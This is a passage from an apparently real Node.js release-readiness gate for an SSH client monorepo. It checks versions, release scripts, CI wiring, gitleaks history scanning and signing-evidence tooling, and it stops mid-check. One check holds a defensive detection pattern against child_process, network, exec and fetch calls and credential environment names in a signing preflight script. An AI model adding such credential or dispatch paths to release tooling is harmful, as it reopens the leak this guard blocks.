import { execFileSync } from "node:child_process";
import { existsSync, readFileSync, readdirSync } from "node:fs";
import { resolve } from "node:path";
import { parseDocument } from "yaml";

const root = resolve(
  readCliValue("--root") ?? resolve(import.meta.dirname, ".."),
);
const rootPackageJson = readJson("package.json");
const expectedVersion = rootPackageJson.version;
const expectedReleaseTag = `v${expectedVersion}`;
const allowUnhealthyGit = process.argv.includes("--allow-unhealthy-git");
const checks = [];
const PUBLIC_RELEASE_PREREQUISITES = Object.freeze([
  "lint",
  "typecheck",
  "test-unit",
  "test-mobile",
  "build",
  "test-e2e",
  "store-runtime-windows",
  "visual-qa",
  "security-audit",
  "rust",
  "desktop-real-ssh-smoke",
  "tauri-shell",
  "lighthouse",
]);
const PUBLIC_RELEASE_RESULT_ENV = Object.freeze({
  LINT_RESULT: "${{ needs.lint.result }}",
  TYPECHECK_RESULT: "${{ needs.typecheck.result }}",
  TEST_UNIT_RESULT: "${{ needs.test-unit.result }}",
  TEST_MOBILE_RESULT: "${{ needs.test-mobile.result }}",
  BUILD_RESULT: "${{ needs.build.result }}",
  TEST_E2E_RESULT: "${{ needs.test-e2e.result }}",
  STORE_RUNTIME_WINDOWS_RESULT: "${{ needs.store-runtime-windows.result }}",
  VISUAL_QA_RESULT: "${{ needs.visual-qa.result }}",
  SECURITY_AUDIT_RESULT: "${{ needs.security-audit.result }}",
  RUST_RESULT: "${{ needs.rust.result }}",
  DESKTOP_REAL_SSH_SMOKE_RESULT: "${{ needs.desktop-real-ssh-smoke.result }}",
  TAURI_SHELL_RESULT: "${{ needs.tauri-shell.result }}",
  LIGHTHOUSE_RESULT: "${{ needs.lighthouse.result }}",
});
const PUBLIC_RELEASE_PREREQUISITE_GATE_RUN = [
  "set -euo pipefail",
  "failed=()",
  "require_success() {",
  '  local job="$1"',
  '  local result="$2"',
  '  if [[ "$result" != "success" ]]; then',
  '    failed+=("${job}=${result}")',
  "  fi",
  "}",
  'require_success "lint" "${LINT_RESULT}"',
  'require_success "typecheck" "${TYPECHECK_RESULT}"',
  'require_success "test-unit" "${TEST_UNIT_RESULT}"',
  'require_success "test-mobile" "${TEST_MOBILE_RESULT}"',
  'require_success "build" "${BUILD_RESULT}"',
  'require_success "test-e2e" "${TEST_E2E_RESULT}"',
  'require_success "store-runtime-windows" "${STORE_RUNTIME_WINDOWS_RESULT}"',
  'require_success "visual-qa" "${VISUAL_QA_RESULT}"',
  'require_success "security-audit" "${SECURITY_AUDIT_RESULT}"',
  'require_success "rust" "${RUST_RESULT}"',
  'require_success "desktop-real-ssh-smoke" "${DESKTOP_REAL_SSH_SMOKE_RESULT}"',
  'require_success "tauri-shell" "${TAURI_SHELL_RESULT}"',
  'require_success "lighthouse" "${LIGHTHOUSE_RESULT}"',
  "if (( ${#failed[@]} != 0 )); then",
  "  printf 'Public Release Readiness blocked by prerequisite results:\\n' >&2",
  `  printf ' - %s\\n' "\${failed[@]}" >&2`,
  "  exit 1",
  "fi",
].join("\n");

checkGitHealth();
checkVersions();
checkPackageScripts();
checkRustDependencySecurity();
checkReleaseToolingFiles();
checkCiPublicReleaseWiring();
checkDependabotAutoMergePolicy();
checkTauriDistributionMetadata();
checkDesktopReleaseMetadata();
checkTauriCapabilities();
checkDesktopHostKeyTrustSurface();
checkDesktopPtyRuntimeSurface();
checkDesktopSftpSafetySurface();
checkDesktopForwardingRuntimeSurface();
checkReleaseDocs();
checkPublicFacingBranding();
checkSyncDistributionFiles();
checkPrivacyPolicy();
checkTelemetryRuntimeControls();
checkWebAdminDataMode();
checkChangelog();

const failures = checks.filter((check) => !check.ok);
for (const check of checks) {
  console.log(
    `${check.ok ? "PASS" : "FAIL"} ${check.label}${check.detail ? ` - ${check.detail}` : ""}`,
  );
}

if (failures.length > 0) {
  process.exit(1);
}

console.log("Public Beta release readiness checks passed.");

function checkGitHealth() {
  if (allowUnhealthyGit) {
    warnIfGitIsUnhealthy();
    return;
  }

  try {
    const output = execFileSync("git", ["rev-parse", "--is-inside-work-tree"], {
      cwd: root,
      encoding: "utf8",
      stdio: ["ignore", "pipe", "pipe"],
    }).trim();
    passIf(output === "true", "Git checkout metadata is healthy");
  } catch (error) {
    fail("Git checkout metadata is healthy", errorMessage(error));
  }
}

function warnIfGitIsUnhealthy() {
  try {
    execFileSync("git", ["rev-parse", "--is-inside-work-tree"], {
      cwd: root,
      encoding: "utf8",
      stdio: ["ignore", "pipe", "pipe"],
    });
    pass("Git checkout metadata is healthy");
  } catch (error) {
    pass(
      "Git checkout metadata check skipped for local planning workspace",
      errorMessage(error),
    );
  }
}

function checkVersions() {
  passIf(
    /^0\.1\.0-beta\.\d+$/.test(expectedVersion),
    `Root package version ${expectedVersion} is a Public Beta release candidate`,
  );

  const jsonFiles = [
    ["Root package", "package.json"],
    ["Desktop package", "apps/desktop/package.json"],
    ["Web package", "apps/web/package.json"],
    ["Mobile package", "apps/mobile/package.json"],
    [
      "Mobile Expo config",
      "apps/mobile/app.json",
      (json) => json.expo?.version,
    ],
    ["Desktop Tauri config", "apps/desktop/src-tauri/tauri.conf.json"],
  ];

  for (const [label, relativePath, selector] of jsonFiles) {
    const json = readJson(relativePath);
    const version = selector ? selector(json) : json.version;
    passIf(
      version === expectedVersion,
      `${label} version is ${expectedVersion}`,
      `found ${String(version)}`,
    );
  }

  checkTomlVersion("Root Cargo workspace", "Cargo.toml");
  checkTomlVersion("Sync service Cargo package", "services/sync/Cargo.toml");
  checkTomlVersion(
    "Desktop Tauri Cargo package",
    "apps/desktop/src-tauri/Cargo.toml",
  );
}

function checkPackageScripts() {
  const packageJson = readJson("package.json");
  for (const scriptName of [
    "qa:release:public",
    "qa:release:public:fixture",
    "qa:release:public:local",
    "qa:prod-audit",
    "qa:lighthouse",
    "test:lighthouse-audit",
    "test:github-release-controls",
    "qa:lighthouse-audit",
    "test:public-beta-dogfood",
    "qa:public-beta-dogfood",
    "qa:rust-advisory",
    "qa:web-admin-proxy-smoke",
    "qa:web-admin-sync-topology-smoke",
    "qa:web-admin-sync-topology-release-smoke",
    "qa:e2e",
    "qa:e2e:fresh",
    "qa:e2e:web-real-sync",
    "qa:e2e:web-real-sync:fresh",
    "qa:sync:backup-restore-smoke",
    "qa:sync:config-guard-smoke",
    "qa:sync:self-hosted-smoke",
    "qa:sync:release-smoke",
    "qa:tauri",
    "qa:desktop:real-ssh-smoke",
    "qa:desktop:real-ssh-smoke:fixture",
    "qa:desktop:real-ssh-smoke:required",
    "test:desktop-real-ssh-smoke-env",
    "test:desktop-real-ssh-smoke-fixture",
    "test:desktop-release-package",
    "qa:desktop-release-package",
    "test:desktop-release-evidence",
    "qa:desktop-release-evidence",
    "test:desktop-release-secrets",
    "qa:desktop-release-secrets",
    "test:desktop-release-diagnostics",
    "qa:desktop-release-diagnostics",
    "test:desktop-release-parity",
    "qa:desktop-release-parity",
    "test:desktop-release-evidence-download",
    "qa:desktop-release-evidence-download",
    "test:desktop-release-evidence-preflight",
    "qa:desktop-release-evidence-preflight",
    "test:desktop-unsigned-staging-report",
    "qa:desktop-unsigned-staging-report",
    "test:web-release",
    "qa:web-release",
    "test:release-sbom",
    "test:release-publish-preflight",
    "test:release-provenance",
    "test:release-rc-audit",
    "test:release-readiness",
    "test:source-prerelease",
    "test:web-admin-bundle-token-scan",
    "test:mobile-public-env",
    "test:third-party-licenses",
    "test:sync-release-package",
    "test:sync-release-evidence",
    "test:web-release-verify",
    "qa:release-sbom",
    "qa:release-publish-preflight",
    "qa:release-provenance",
    "qa:release-rc-audit",
    "qa:release-readiness",
    "qa:source-prerelease",
    "qa:third-party-licenses",
    "qa:release-preparation:contracts",
    "qa:release-preparation",
    "qa:web-admin-bundle-token-scan",
    "qa:mobile-public-env",
    "qa:sync-release-package",
    "qa:sync-release-evidence",
    "qa:sync:release-backup-restore-smoke",
    "release:desktop:build",
    "release:desktop:legal-resource",
    "release:desktop:package",
    "release:desktop:checksums",
    "release:desktop:secret-template",
    "release:desktop:evidence-diagnostics",
    "release:desktop:verify-evidence",
    "release:desktop:evidence-download",
    "release:desktop:draft",
    "release:desktop:unsigned-staging-report",
    "release:history-secret-scan",
    "release:github-controls",
    "release:dogfood-template",
    "release:publish-preflight",
    "release:provenance",
    "release:provenance:verify",
    "release:rc-audit",
    "release:rc-audit:report",
    "release:verify-checksums",
    "release:sbom",
    "release:sbom:verify",
    "release:source-prerelease",
    "release:source-prerelease:verify",
    "release:third-party-licenses",
    "release:third-party-licenses:verify",
    "release:sync",
    "release:web",
  ]) {
    passIf(
      typeof packageJson.scripts?.[scriptName] === "string",
      `Root release script '${scriptName}' exists`,
    );
  }

  passIf(
    packageJson.scripts?.["test:source-prerelease"] ===
      "node --test scripts/create-github-source-prerelease.test.mjs" &&
      packageJson.scripts?.["qa:source-prerelease"] ===
        "npm run test:source-prerelease" &&
      packageJson.scripts?.["release:source-prerelease"] ===
        "node scripts/create-github-source-prerelease.mjs" &&
      packageJson.scripts?.["release:source-prerelease:verify"] ===
        "node scripts/create-github-source-prerelease.mjs --verify-published",
    "Root source prerelease scripts use the reviewed entry point and tests",
  );
  passIf(
    packageJson.scripts?.["test:github-release-controls"] ===
      "node --test scripts/check-github-release-controls.test.mjs" &&
      packageJson.scripts?.["release:github-controls"] ===
        "node scripts/check-github-release-controls.mjs",
    "Root GitHub release-controls scripts use the reviewed read-only gate",
  );

  const desktopChecksumsScript =
    packageJson.scripts?.["release:desktop:checksums"] ?? "";
  const desktopPackageScript =
    packageJson.scripts?.["release:desktop:package"] ?? "";
  passIf(
    desktopPackageScript.includes("--require-platforms") &&
      desktopPackageScript.includes("windows,macos,linux"),
    "Desktop release package script requires Windows, macOS, and Linux artifacts by default",
    desktopPackageScript,
  );
  passIf(
    desktopChecksumsScript.includes("release:desktop:package") ||
      desktopChecksumsScript.includes("package-desktop-release.mjs"),
    "Desktop checksum script uses release packaging evidence flow",
    desktopChecksumsScript,
  );
  passIf(
    !desktopChecksumsScript.includes("generate-artifact-checksums.mjs") &&
      !desktopChecksumsScript.includes("target/release/bundle"),
    "Desktop checksum script does not bypass Desktop release evidence",
    desktopChecksumsScript,
  );

  const releasePreparationScript =
    packageJson.scripts?.["qa:release-preparation"] ?? "";
  passIf(
    releasePreparationScript ===
      "npm run qa:release-preparation:contracts && npm run release:history-secret-scan",
    "Release preparation gate executes the real full-history secret scan",
    releasePreparationScript,
  );
  passIf(
    packageJson.scripts?.["release:history-secret-scan"] ===
      "node scripts/check-git-history-secrets.mjs",
    "Full-history secret scan uses the reviewed fail-closed checker",
    packageJson.scripts?.["release:history-secret-scan"] ?? "",
  );

  const releaseVerifyChecksumsScript =
    packageJson.scripts?.["release:verify-checksums"] ?? "";
  passIf(
    releaseVerifyChecksumsScript.includes("verify-artifact-checksums.mjs") &&
      releaseVerifyChecksumsScript.includes("--all-release"),
    "Release checksum script verifies all staged release checksum manifests",
    releaseVerifyChecksumsScript,
  );

  const releaseProvenanceScript =
    packageJson.scripts?.["release:provenance"] ?? "";
  passIf(
    releaseProvenanceScript.includes("generate-release-provenance.mjs"),
    "Release provenance script generates release provenance on release machines",
    releaseProvenanceScript,
  );
  const releaseProvenanceVerifyScript =
    packageJson.scripts?.["release:provenance:verify"] ?? "";
  passIf(
    releaseProvenanceVerifyScript.includes("verify-release-provenance.mjs"),
    "Release provenance verify script verifies release provenance",
    releaseProvenanceVerifyScript,
  );

  passIf(
    !packageJson.scripts?.["release:desktop:configure-secrets"] &&
      !packageJson.scripts?.["release:desktop:evidence-preflight"] &&
      !packageJson.scripts?.["release:desktop:evidence-workflow"],
    "Root package exposes no Desktop signing mutation, preflight, or workflow dispatch command",
  );
  passIf(
    packageJson.scripts?.["release:desktop:secret-template"] ===
      "node scripts/configure-desktop-release-secrets.mjs --write-template",
    "Desktop signer template command is offline and template-only",
    packageJson.scripts?.["release:desktop:secret-template"] ?? "",
  );
  const desktopEvidenceDownloadScript =
    packageJson.scripts?.["release:desktop:evidence-download"] ?? "";
  passIf(
    desktopEvidenceDownloadScript.includes(
      "download-desktop-release-evidence.mjs",
    ),
    "Desktop formal evidence download script imports workflow evidence",
    desktopEvidenceDownloadScript,
  );
  const desktopEvidenceDiagnosticsScript =
    packageJson.scripts?.["release:desktop:evidence-diagnostics"] ?? "";
  passIf(
    desktopEvidenceDiagnosticsScript.includes(
      "diagnose-desktop-release-evidence.mjs",
    ) && desktopEvidenceDiagnosticsScript.includes("--no-fail"),
    "Desktop formal evidence diagnostics script writes a non-mutating unblock report",
    desktopEvidenceDiagnosticsScript,
  );

  const publicReleaseScript = packageJson.scripts?.["qa:release:public"] ?? "";
  const publicReleaseFixtureScript =
    packageJson.scripts?.["qa:release:public:fixture"] ?? "";
  passIf(
    /\brun-real-ssh-smoke-fixture\.mjs\b/.test(publicReleaseFixtureScript) &&
      /(?:^|\s)--\s+npm\s+run\s+qa:release:public(?:\s|$)/.test(
        publicReleaseFixtureScript,
      ),
    "Fixture-backed Public release QA runs the full public gate under local OpenSSH dogfood",
    publicReleaseFixtureScript,
  );
  passIf(
    publicReleaseScript.includes("qa:desktop:real-ssh-smoke:required"),
    "Public release QA requires real Desktop SSH smoke fixture",
    publicReleaseScript,
  );
  passIf(
    publicReleaseScript.includes("qa:rust-advisory"),
    "Public release QA runs Rust advisory audit",
    publicReleaseScript,
  );
  passIf(
    publicReleaseScript.includes("qa:web-admin-sync-topology-release-smoke"),
    "Public release QA runs Web Admin topology smoke against the staged Sync release binary",
    publicReleaseScript,
  );
  passIf(
    publicReleaseScript.includes("qa:lighthouse"),
    "Public release QA runs Web Admin Lighthouse on the release machine",
    publicReleaseScript,
  );
  passIf(
    publicReleaseScript.includes("qa:mobile-public-env"),
    "Public release QA rejects mobile public bearer-token env",
    publicReleaseScript,
  );
  passIf(
    hasFinalSyncReleaseEvidenceVerification(publicReleaseScript),
    "Public release QA verifies Sync packaged release evidence after local Sync smokes",
    publicReleaseScript,
  );

  const publicReleaseLocalScript =
    packageJson.scripts?.["qa:release:public:local"] ?? "";
  passIf(
    publicReleaseLocalScript.includes("qa:desktop:real-ssh-smoke:required"),
    "Local public release QA requires real Desktop SSH smoke fixture",
    publicReleaseLocalScript,
  );
  passIf(
    publicReleaseLocalScript.includes("qa:mobile-public-env"),
    "Local public release QA rejects mobile public bearer-token env",
    publicReleaseLocalScript,
  );
  passIf(
    hasFinalSyncReleaseEvidenceVerification(publicReleaseLocalScript),
    "Local public release QA verifies Sync packaged release evidence after local Sync smokes",
    publicReleaseLocalScript,
  );

  const mobilePublicEnvScript =
    packageJson.scripts?.["qa:mobile-public-env"] ?? "";
  passIf(
    mobilePublicEnvScript.includes("test:mobile-public-env") &&
      mobilePublicEnvScript.includes("check-mobile-public-env.mjs"),
    "Mobile public env QA runs tests and the env guard",
    mobilePublicEnvScript,
  );

  const requiredRealSshSmokeScript =
    packageJson.scripts?.["qa:desktop:real-ssh-smoke:required"] ?? "";
  passIf(
    requiredRealSshSmokeScript.includes("require-real-ssh-smoke-env.mjs") &&
      requiredRealSshSmokeScript.includes("qa:desktop:real-ssh-smoke"),
    "Required Desktop SSH smoke verifies fixture env before running dogfood",
    requiredRealSshSmokeScript,
  );
  const fixtureRealSshSmokeScript =
    packageJson.scripts?.["qa:desktop:real-ssh-smoke:fixture"] ?? "";
  passIf(
    fixtureRealSshSmokeScript.includes("run-real-ssh-smoke-fixture.mjs"),
    "Desktop SSH smoke fixture runner is available for release-machine dogfood",
    fixtureRealSshSmokeScript,
  );

  const rootQaScript = packageJson.scripts?.qa ?? "";
  passIf(
    rootQaScript.includes("qa:source-prerelease"),
    "Root QA runs source prerelease contract tests",
    rootQaScript,
  );
  passIf(
    rootQaScript.includes("qa:desktop-release-diagnostics"),
    "Root QA runs Desktop formal evidence diagnostics tests",
    rootQaScript,
  );
  passIf(
    rootQaScript.includes("qa:desktop-release-parity"),
    "Root QA runs Desktop formal evidence parity checks",
    rootQaScript,
  );
  passIf(
    rootQaScript.includes("qa:e2e:fresh"),
    "Root QA runs E2E on fresh local ports",
    rootQaScript,
  );
  passIf(
    !/\bnpm run qa:e2e(?:\s*(?:&&|$))/.test(rootQaScript),
    "Root QA avoids non-fresh E2E server reuse",
    rootQaScript,
  );
}

function checkRustDependencySecurity() {
  const coreCargo = readTextIfExists("crates/core/Cargo.toml") ?? "";
  const russhLine = coreCargo
    .split(/\r?\n/)
    .find((line) => line.trimStart().startsWith("russh ="));

  passIf(
    russhLine?.includes("default-features = false") === true &&
      russhLine.includes('"ring"') &&
      russhLine.includes('"flate2"') &&
      !russhLine.includes('"rsa"'),
    "Rust SSH dependency keeps vulnerable RSA feature disabled for Public Beta",
    russhLine ?? "missing russh dependency",
  );
}

function checkCiPublicReleaseWiring() {
  const ci = readText(".github/workflows/ci.yml");
  const requiredSnippets = [
    "npm run qa:artifact-checksums",
    "npm run qa:desktop-release-package",
    "npm run qa:desktop-release-evidence",
    "npm run qa:desktop-release-secrets",
    "npm run qa:desktop-release-diagnostics",
    "npm run qa:desktop-release-parity",
    "npm run qa:desktop-release-evidence-download",
    "npm run qa:desktop-release-evidence-preflight",
    "npm run qa:sync-release-package",
    "npm run qa:sync-release-evidence",
    "npm run qa:web-release",
    "npm run qa:release-sbom",
    "npm run qa:third-party-licenses",
    "npm run qa:release-draft",
    "npm run qa:release-publish-preflight",
    "npm run qa:release-preparation",
    "npm run qa:release-provenance",
    "npm run qa:lighthouse-audit",
    "npm run test:web-admin-bundle-token-scan",
    "npm run qa:e2e:fresh",
    "npm run qa:e2e:web-real-sync:fresh",
    "npm run qa:e2e:visual:fresh",
    "npx --no-install vitest run --coverage",
    "npx --no-install playwright install --with-deps chromium",
    "npx --no-install playwright install chromium",
    "npm install --global --ignore-scripts --no-audit --no-fund npm@10.9.7",
    'test "$(npm --version)" = "10.9.7"',
    "npm run qa:prod-audit",
    "npm run qa:desktop:real-ssh-smoke",
    'JOESSH_REAL_SSH_SMOKE: "1"',
    "desktop-real-ssh-smoke",
    "npm run qa:lighthouse",
    "npm run qa:tauri",
    "npm run qa:mobile:native-preflight",
    "npm run qa:mobile-public-env",
    "npm run qa:source-prerelease",
    "cargo install cargo-audit --version 0.22.2 --locked",
    "node --test scripts/run-rust-advisory-gate.test.mjs scripts/rust-maintenance-policy.test.mjs scripts/rust-audit-transport.test.mjs scripts/vendored-rust-contract.test.mjs scripts/vendored-rust-audit.test.mjs",
    "cargo test --manifest-path apps/desktop/src-tauri/Cargo.toml --release --lib --locked",
    "cargo test --manifest-path apps/desktop/src-tauri/Cargo.toml --release --test variant_str_iter --locked",
    "node --test scripts/package-windows-invite-beta.test.mjs scripts/prepare-windows-store-candidate.test.mjs",
    "node scripts/run-rust-advisory-gate.mjs",
    "npm run release:sbom",
    "npm run release:sbom:verify",
    "npm run release:third-party-licenses",
    "npm run release:third-party-licenses:verify",
    "npm run qa:web-admin-proxy-smoke",
    "npm run qa:web-admin-bundle-token-scan",
    "npm run qa:web-admin-sync-topology-release-smoke",
    "npm run qa:sync:self-hosted-smoke",
    "npm run qa:sync:release-smoke",
    "npm run qa:sync:release-backup-restore-smoke",
    "npm run qa:sync:config-guard-smoke",
    "npm run qa:sync:backup-restore-smoke",
    "node scripts/verify-sync-release-evidence.mjs",
    "node scripts/check-public-release-readiness.mjs",
    "fetch-depth: 0",
    "https://github.com/gitleaks/gitleaks/releases/download/v8.30.1/gitleaks_8.30.1_linux_x64.tar.gz",
    "551f6fc83ea457d62a0d98237cbad105af8d557003051f41f3e7ca7b3f2470eb",
    "sha256sum --check --strict -",
    'if [[ "${actual_version}" != "${GITLEAKS_VERSION}" ]]; then',
    "Scan full Git history before dependency installation",
    "17692ae221e51b1fe8fa4cd7862e02258d23a8873fc75ebd12251a0372fa2dfe",
    "a60c709073214edf6582b7cb911364b184743516b30a4970493195d04ee47ccf",
    '"${gitleaks_bin}" git',
    "JOESSH_GITLEAKS_COMMAND: ${{ runner.temp }}/gitleaks-bin/gitleaks",
  ];

  for (const snippet of requiredSnippets) {
    passIf(ci.includes(snippet), `CI public release gate runs '${snippet}'`);
  }

  const workflow = parseWorkflow(ci);
  const rustJob = workflow?.jobs?.rust;
  const rustAuditStep = Array.isArray(rustJob?.steps)
    ? rustJob.steps.find(
        (step) => step?.run === "node scripts/run-rust-advisory-gate.mjs",
      )
    : undefined;
  passIf(
    isRecord(rustAuditStep) &&
      !Object.hasOwn(rustAuditStep, "if") &&
      !Object.hasOwn(rustAuditStep, "continue-on-error") &&
      !Object.hasOwn(rustJob, "if") &&
      !Object.hasOwn(rustJob, "continue-on-error"),
    "CI Rust job requires the strict audit of both lockfiles without skipping failures",
  );
  const publicReleaseJob = isRecord(
    workflow?.jobs?.["public-release-readiness"],
  )
    ? workflow.jobs["public-release-readiness"]
    : null;
  const prerequisiteGate =
    publicReleaseJob &&
    Array.isArray(publicReleaseJob.steps) &&
    isRecord(publicReleaseJob.steps[0])
      ? publicReleaseJob.steps[0]
      : null;
  passIf(
    publicReleaseJob?.if === "${{ always() }}",
    "CI Public Release Readiness always runs after every prerequisite result",
    "expected the exact job-level condition '${{ always() }}'",
  );
  passIf(
    publicReleaseJob !== null &&
      JSON.stringify(publicReleaseJob.needs) ===
        JSON.stringify(PUBLIC_RELEASE_PREREQUISITES) &&
      prerequisiteGate?.name === "Require every prerequisite job to succeed" &&
      prerequisiteGate?.shell === "bash" &&
      JSON.stringify(prerequisiteGate?.env) ===
        JSON.stringify(PUBLIC_RELEASE_RESULT_ENV) &&
      normalizeLineEndings(prerequisiteGate?.run ?? "").trim() ===
        PUBLIC_RELEASE_PREREQUISITE_GATE_RUN,
    "CI Public Release Readiness fails closed on every exact prerequisite result",
    "expected the complete needs/result mapping and first-step success-only assertion contract",
  );

  const publicReleaseJobMatch = ci.match(
    /(?:^|\n) {2}public-release-readiness:\s*\n/,
  );
  let publicReleaseJobText = "";
  if (publicReleaseJobMatch?.index !== undefined) {
    const start = publicReleaseJobMatch.index + publicReleaseJobMatch[0].length;
    const remainder = ci.slice(start);
    const nextJob = remainder.match(/\n {2}[A-Za-z0-9_-]+:\s*\n/);
    publicReleaseJobText =
      nextJob?.index === undefined
        ? remainder
        : remainder.slice(0, nextJob.index);
  }
  const licenseChain = [
    "npm run release:sbom",
    "npm run release:sbom:verify",
    "npm run release:third-party-licenses",
    "npm run release:third-party-licenses:verify",
  ];
  let previousLicenseStep = -1;
  const orderedLicenseChain = licenseChain.every((step) => {
    const index = publicReleaseJobText.indexOf(step);
    const ordered = index > previousLicenseStep;
    previousLicenseStep = index;
    return ordered;
  });
  passIf(
    publicReleaseJobText !== "" && orderedLicenseChain,
    "CI Public Release Readiness runs SBOM generation/verification before full third-party license generation/verification",
  );
  passIf(
    !/\bnpm run qa:e2e(?:\s|$)/.test(ci),
    "CI E2E job avoids non-fresh E2E server reuse",
  );
}

function checkReleaseToolingFiles() {
  for (const relativePath of [
    "scripts/package-desktop-release.mjs",
    "scripts/package-desktop-release.test.mjs",
    "scripts/configure-desktop-release-secrets.mjs",
    "scripts/configure-desktop-release-secrets.test.mjs",
    "scripts/diagnose-desktop-release-evidence.mjs",
    "scripts/diagnose-desktop-release-evidence.test.mjs",
    "scripts/check-desktop-release-evidence-parity.mjs",
    "scripts/check-desktop-release-evidence-parity.test.mjs",
    "scripts/package-sync-release.mjs",
    "scripts/package-sync-release.test.mjs",
    "scripts/verify-sync-release-evidence.mjs",
    "scripts/verify-sync-release-evidence.test.mjs",
    "scripts/verify-desktop-release-evidence.mjs",
    "scripts/verify-desktop-release-evidence.test.mjs",
    "scripts/download-desktop-release-evidence.mjs",
    "scripts/download-desktop-release-evidence.test.mjs",
    "scripts/report-desktop-unsigned-staging.mjs",
    "scripts/report-desktop-unsigned-staging.test.mjs",
    "scripts/desktop-release-evidence-preflight.mjs",
    "scripts/desktop-release-evidence-preflight.test.mjs",
    "scripts/require-real-ssh-smoke-env.mjs",
    "scripts/require-real-ssh-smoke-env.test.mjs",
    "scripts/run-real-ssh-smoke-fixture.mjs",
    "scripts/run-real-ssh-smoke-fixture.test.mjs",
    "scripts/verify-public-beta-dogfood-evidence.mjs",
    "scripts/verify-public-beta-dogfood-evidence.test.mjs",
    "scripts/package-web-release.mjs",
    "scripts/package-web-release.test.mjs",
    "scripts/verify-web-release-package.mjs",
    "scripts/verify-web-release-package.test.mjs",
    "scripts/check-web-admin-bundle-token-scan.mjs",
    "scripts/check-web-admin-bundle-token-scan.test.mjs",
    "scripts/check-mobile-public-env.mjs",
    "scripts/check-mobile-public-env.test.mjs",
    "scripts/lighthouse-audit.mjs",
    "scripts/create-github-release-draft.mjs",
    "scripts/create-github-release-draft.test.mjs",
    "scripts/create-github-source-prerelease.mjs",
    "scripts/create-github-source-prerelease.test.mjs",
    "scripts/check-github-release-controls.mjs",
    "scripts/check-github-release-controls.test.mjs",
    "scripts/smoke-web-admin-proxy.mjs",
    "scripts/smoke-web-admin-sync-release-topology.mjs",
    "scripts/smoke-sync-backup-restore.mjs",
    "scripts/smoke-sync-config-guard.mjs",
    "scripts/generate-release-sbom.mjs",
    "scripts/verify-release-sbom.mjs",
    "scripts/verify-release-sbom.test.mjs",
    "scripts/release-sbom-contract.mjs",
    "scripts/generate-third-party-licenses.mjs",
    "scripts/verify-third-party-licenses.mjs",
    "scripts/third-party-license-contract.mjs",
    "scripts/third-party-licenses.test.mjs",
    "scripts/generate-release-provenance.mjs",
    "scripts/verify-release-provenance.mjs",
    "scripts/verify-release-provenance.test.mjs",
    "scripts/audit-public-beta-rc.mjs",
    "scripts/audit-public-beta-rc.test.mjs",
    "scripts/release-publish-preflight.mjs",
    "scripts/release-publish-preflight.test.mjs",
  ]) {
    passIf(
      existsSync(resolve(root, relativePath)),
      `Release tooling file '${relativePath}' exists`,
    );
  }

  const desktopPackager =
    readTextIfExists("scripts/package-desktop-release.mjs") ?? "";
  const dogfoodVerifier =
    readTextIfExists("scripts/verify-public-beta-dogfood-evidence.mjs") ?? "";
  const unsignedStagingReporter =
    readTextIfExists("scripts/report-desktop-unsigned-staging.mjs") ?? "";
  passIf(
    dogfoodVerifier.includes("desktop-install-launch") &&
      dogfoodVerifier.includes("sync-backup-restore-rollback") &&
      dogfoodVerifier.includes("open P0") &&
      dogfoodVerifier.includes("open P1"),
    "Public Beta dogfood verifier covers top operator tasks and P0/P1 blockers",
  );
  passIf(
    unsignedStagingReporter.includes("publicReleaseEvidence: false") &&
      unsignedStagingReporter.includes("reports/release") &&
      unsignedStagingReporter.includes("authenticode") &&
      unsignedStagingReporter.includes("sha256File(path)") &&
      unsignedStagingReporter.includes("versionMatchesPackage"),
    "Desktop unsigned staging reporter records handoff evidence without weakening release artifacts",
  );
  passIf(
    desktopPackager.includes("artifactSha256") &&
      desktopPackager.includes("sha256: artifactSha256"),
    "Desktop release packager records artifact SHA256 in release evidence",
  );
  passIf(
    desktopPackager.includes(
      "Desktop bundle source contains artifact(s) that do not include",
    ) &&
      desktopPackager.includes("releaseVersion") &&
      desktopPackager.includes("basename(artifact.path)"),
    "Desktop release packager rejects stale source bundle artifacts before staging",
  );
  passIf(
    desktopPackager.includes("validateSignatureEvidence(sourceArtifacts)") &&
      desktopPackager.includes(
        "Windows Desktop artifacts require --windows-signature-verification",
      ) &&
      desktopPackager.indexOf("validateSignatureEvidence(sourceArtifacts)") <
        desktopPackager.indexOf("mkdirSync(outputDir"),
    "Desktop release packager validates signing evidence before staging artifacts",
  );

  const desktopEvidenceVerifier =
    readTextIfExists("scripts/verify-desktop-release-evidence.mjs") ?? "";
  passIf(
    desktopEvidenceVerifier.includes("sha256File(fullPath)") &&
      desktopEvidenceVerifier.includes("hash mismatch"),
    "Desktop release evidence verifier recomputes artifact hashes from disk",
  );
  passIf(
    desktopEvidenceVerifier.includes("artifact.sha256") &&
      desktopEvidenceVerifier.includes("sha256 must match"),
    "Desktop release evidence verifier binds artifact SHA256 to the checksum manifest",
  );
  passIf(
    desktopEvidenceVerifier.includes("release-evidence-SHA256SUMS.txt") &&
      desktopEvidenceVerifier.includes(
        "missing desktop evidence checksum manifest",
      ) &&
      desktopEvidenceVerifier.includes(
        "desktop evidence checksum manifest hash mismatch",
      ),
    "Desktop release evidence verifier binds release evidence JSON to its checksum manifest",
  );
  passIf(
    desktopEvidenceVerifier.includes("release-evidence-source.json") &&
      desktopEvidenceVerifier.includes("--require-source") &&
      desktopEvidenceVerifier.includes(
        "workflowRun.headSha must match releaseTagCommit",
      ) &&
      desktopEvidenceVerifier.includes("Package Formal Desktop Evidence"),
    "Desktop release evidence verifier can require formal workflow source provenance",
  );
  passIf(
    desktopEvidenceVerifier.includes(
      "must mention the artifact path, artifact file name, or artifact sha256",
    ),
    "Desktop release evidence verifier binds signing proof text to artifact identity",
  );

  const desktopEvidencePreflight =
    readTextIfExists("scripts/desktop-release-evidence-preflight.mjs") ?? "";
  passIf(
    desktopEvidencePreflight.includes("FORMAL_SIGNING_DISABLED") &&
      desktopEvidencePreflight.includes(
        "approved externally managed isolated signer",
      ) &&
      desktopEvidencePreflight.includes(
        "historical offline evidence verification tools do not form a runnable signing chain",
      ) &&
      !/node:(?:child_process|https?|net)|\b(?:spawn|exec)(?:Sync)?\s*\(|\bfetch\s*\(/.test(
        desktopEvidencePreflight,
      ) &&
      !desktopEvidencePreflight.includes("process.env") &&
      !desktopEvidencePreflight.includes("formal_evidence=true") &&
      !desktopEvidencePreflight.includes("desktop-release-signing") &&
      !/ATLASTERM_(?:WINDOWS|APPLE|KEYCHAIN)_[A-Z0-9_]+/.test(
        desktopEvidencePreflight,
      ),
    "Desktop formal evidence preflight is a fail-closed compatibility guard with no credential or dispatch path",
  );

  const desktopEvidenceDownloader =
    readTextIfExists("scripts/download-desktop-release-evidence.mjs") ?? "";
  passIf(
